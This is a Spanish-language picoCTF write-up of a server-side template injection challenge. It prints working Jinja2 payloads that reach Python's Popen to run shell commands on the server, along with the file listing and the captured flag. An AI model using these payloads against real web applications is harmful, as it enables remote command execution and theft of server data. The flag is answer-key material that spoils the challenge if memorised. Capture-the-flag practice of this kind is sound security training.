### SSTI1
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:57071/)!
### Solución 
Realizamos inyeccion Jinja2

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
 De este modo nos da una lista de clases separadas por comas, se hace otra inyeccion para encontrar la linea con la clase Popen y hacer ls para ver sus archivos, que nos permita interactuar con el sistema operativo.
```
 {% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('ls', shell=True, stdout=-1).communicate()[0].decode('utf-8') }}{% endif %}{% endfor %}
```
Al encotrarla nos mostro estos archivos.
```
__pycache__

app.py

flag

requirements.txt
```
ahi esta la bandera, solo cambiamos en la inyeccion el ls por cat.
```
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__ == 'Popen' %}{{ c('cat flag', shell=True, stdout=-1).communicate()[0].decode('utf-8') }}{% endif %}{% endfor %}
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
### Notas
los desarrolladores web usan "motores de plantillas" (como Jinja2 en Python/Flask, Twig en PHP, o Pug en Node.js) para crear páginas HTML dinámicas. En lugar de escribir el mismo código HTML cien veces, hacen una plantilla y le inyectan variables.

El problema ocurre cuando el servidor confía ciegamente en lo que el usuario escribe y lo evalúa como si fuera código del motor de plantillas, en lugar de tratarlo como simple texto.